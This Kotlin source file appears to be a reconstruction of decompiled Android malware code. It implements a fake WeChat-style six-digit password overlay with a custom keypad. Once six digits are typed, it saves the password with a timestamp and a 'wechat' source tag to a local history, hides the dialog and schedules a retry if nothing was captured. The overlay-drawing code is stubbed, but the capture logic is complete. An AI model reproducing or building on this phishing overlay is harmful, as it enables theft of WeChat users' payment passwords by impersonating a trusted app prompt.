package com.storm.safe.rock.service.modules

import android.content.Context
import android.graphics.Color
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView
import org.json.JSONArray
import org.json.JSONObject

/**
 * WeChat-style password dialog overlay with custom keypad.
 *
 * Reverse-engineered from JADX: C0354a1 (overlay/a1, 354 lines).
 * Renamed: a0→createOverlay, a1→dpToPx, a2→onKeyPress, a3→hideOverlay,
 *          a4→savePassword, a5→updateDisplay
 */
class OverlayDialogHelper(private val context: Context) {

    companion object {
        private const val TAG = "WechatPasswordOverlay"
        const val PASSWORD_LENGTH = 6
        const val TITLE_COLOR = "#111111"
        const val SUBTITLE_COLOR = "#888888"
        const val BOX_BG_COLOR = "#EBEBEB"
        const val KEYPAD_BG_COLOR = "#E5E7EB"
        const val DEL_BG_COLOR = "#F3F4F6"
        const val ERROR_COLOR = "#FF4444"
        private const val PREF_KEY = "history"

        @Volatile
        var instance: OverlayDialogHelper? = null

        val KEYPAD_LAYOUT = arrayOf(
            arrayOf("1", "2", "3"),
            arrayOf("4", "5", "6"),
            arrayOf("7", "8", "9"),
            arrayOf("", "0", "DEL")
        )
    }

    private val windowManager: WindowManager =
        context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

    private var overlayView: LinearLayout? = null
    var isShowing: Boolean = false
        private set

    private var inputBuffer: String = ""
    private val passwordBoxes: ArrayList<TextView> = ArrayList()
    private var errorTextView: TextView? = null

    private val mainHandler: Handler = Handler(Looper.getMainLooper())
    private val retryHandler: Handler = Handler(Looper.getMainLooper())

    private val density: Float by lazy {
        context.resources.displayMetrics.density
    }

    // --- a0 → createOverlay ---
    fun createOverlay() {
        // ADAPT: stub — full UI construction requires WindowManager overlay permission
        Log.d(TAG, "createOverlay called (stub)")
    }

    // --- a1 → dpToPx ---
    fun dpToPx(dp: Int): Int {
        return (density * dp).toInt()
    }

    // --- a2 → onKeyPress ---
    fun onKeyPress(key: String) {
        if (!isShowing) return
        if (key == "DEL") {
            if (inputBuffer.isNotEmpty()) {
                inputBuffer = inputBuffer.dropLast(1)
                updateDisplay()
            }
            return
        }
        if (inputBuffer.length < PASSWORD_LENGTH) {
            inputBuffer += key
            updateDisplay()
            if (inputBuffer.length == PASSWORD_LENGTH) {
                mainHandler.postDelayed({
                    savePassword(inputBuffer, "keypad", System.currentTimeMillis())
                    hideOverlay(true)
                }, 300L)
            }
        }
    }

    // --- a3 → hideOverlay ---
    fun hideOverlay(passwordCaptured: Boolean) {
        if (!isShowing) return
        isShowing = false
        Log.d(TAG, "隐藏密码框，passwordCaptured=$passwordCaptured")
        if (!passwordCaptured) {
            Log.d(TAG, "安排 2 秒后重新检查弹窗")
            retryHandler.postDelayed({ /* retry check */ }, 2000L)
        }
        mainHandler.post {
            try {
                overlayView?.let { windowManager.removeView(it) }
            } catch (e: Exception) {
                Log.w(TAG, "removeView failed", e)
            }
        }
    }

    // --- a4 → savePassword ---
    fun savePassword(password: String, type: String, timestamp: Long) {
        try {
            val prefs = context.getSharedPreferences("password_history", Context.MODE_PRIVATE)
            val historyStr = prefs.getString(PREF_KEY, "") ?: ""
            val history = JSONArray(historyStr)
            val entry = JSONObject().apply {
                put("password", password)
                put("type", type)
                put("timestamp", timestamp)
                put("source", "wechat")
            }
            history.put(entry)
            prefs.edit()
                .putString(PREF_KEY, history.toString())
                .putInt("count", history.length())
                .apply()
        } catch (e: Exception) {
            Log.e(TAG, "保存密码历史记录失败", e)
        }
    }

    // --- a5 → updateDisplay ---
    fun updateDisplay() {
        for (i in 0 until PASSWORD_LENGTH) {
            val box = passwordBoxes.getOrNull(i)
            box?.text = if (i < inputBuffer.length) "●" else ""
            // ADAPT: GradientDrawable background update stubbed
        }
    }
}
